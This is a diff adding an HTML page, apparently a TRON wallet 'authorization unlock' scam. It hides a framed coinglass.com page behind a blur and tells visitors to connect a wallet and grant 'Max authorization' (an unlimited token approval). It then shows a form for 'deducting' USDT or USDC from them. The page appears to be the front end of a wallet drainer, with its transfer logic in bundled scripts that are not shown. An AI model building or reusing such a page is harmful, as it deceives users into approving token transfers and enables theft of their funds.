@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TRON 授權解鎖服務 (Vite V2 混合修復)</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+<script src="https://unpkg.com/tron-web-walletconnect@0.1.3/dist/tron-web-walletconnect.umd.js"></script>
+
+<style>
+/* 為了方便，這裡是完整的 CSS 樣式，確保頁面佈局正確 */
+body { margin: 0; padding: 0; overflow: hidden; font-family: Arial, sans-serif; }
+#connectButton { 
+    position: fixed; top: 20px; right: 20px; background: white; color: #007bff; border: 2px solid #007bff; border-radius: 50%; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; font-size: 20px; padding: 0; cursor: pointer; z-index: 2000;
+}
+#connectButton:hover { background: #007bff; color: white; }
+#connectButton.connected { background: #28a745; border-color: #28a745; color: white; }
+#coinglassIframe { width: 100vw; height: 100vh; border: none; }
+#blurOverlay { 
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; backdrop-filter: blur(10px); background-color: rgba(0, 0, 0, 0.4); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; font-size: 24px; font-weight: bold; transition: opacity 0.3s ease;
+}
+#overlayMessage { padding: 20px; border: 2px solid white; border-radius: 8px; background-color: rgba(0, 0, 0, 0.7); }
+#deductionForm {
+    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); z-index: 1500; display: none; text-align: left; color: #333; width: 300px;
+}
+#deductionForm h3 { margin-top: 0; color: #007bff; }
+#deductionForm label { display: block; margin-top: 15px; margin-bottom: 5px; font-weight: bold; }
+#deductionForm input, #deductionForm select { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin-bottom: 10px; }
+#deductionForm button { background-color: #28a745; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; width: 100%; }
+</style>
+  <script type="module" crossorigin src="/tron20/assets/index-DtGTRBD1.js"></script>
+  <link rel="modulepreload" crossorigin href="/tron20/assets/rolldown-runtime-DGruFWvd.js">
+  <link rel="modulepreload" crossorigin href="/tron20/assets/vendor-DNmqtIMk.js">
+  <link rel="stylesheet" crossorigin href="/tron20/assets/index-BRH9nwdz.css">
+</head>
+<body>
+<i id="connectButton" class="fas fa-wallet" title="連繫錢包"></i>
+
+<iframe id="coinglassIframe" src="https://www.coinglass.com/" allowfullscreen></iframe>
+
+<div id="blurOverlay">
+    <div id="overlayMessage">
+        請連繫您的錢包並完成**Max 授權**以解鎖內容 🔒
+        <p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>
+    </div>
+</div>
+
+<div id="deductionForm">
+    <h3>歡迎！請確認首筆扣款</h3>
+    <p>您已完成 Max 授權，請輸入要扣除的金額。</p>
+    
+    <label for="tokenSelectForm">選擇扣款幣種:</label>
+    <select id="tokenSelectForm">
+        <option value="USDT">USDT</option>
+        <option value="USDC">USDC</option>
+    </select>
+    
+    <label for="deductionAmount">輸入金額:</label>
+    <input type="number" id="deductionAmount" value="5.00" min="0.01" step="0.01">
+
+    <button onclick="triggerDeductionFromForm()">確認並發起扣款</button>
+</div>
+
+</body>
+</html>
